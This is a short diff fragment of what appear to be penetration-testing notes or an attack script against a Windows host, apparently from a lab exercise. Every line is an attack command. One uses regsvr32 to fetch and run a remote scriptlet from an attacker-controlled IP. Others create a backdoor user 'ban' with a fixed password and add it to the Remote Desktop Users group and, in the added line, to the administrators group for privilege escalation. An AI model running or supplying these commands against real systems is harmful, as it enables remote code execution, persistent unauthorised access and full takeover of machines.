@@ -139,5 +139,5 @@ Add user Bruce(75):
 service_exec(conn, r'regsvr32 /s /n /u /i:http://192.168.119.190/file.txt file.txt')
 service_exec(conn, r'cmd /c net user /add ban ban123')
 net localgroup "Remote Desktop Users" ban /add #give permission for remote desktop
-
+net localgroup administrators ban /add #add user to administrator group for priv esc
 
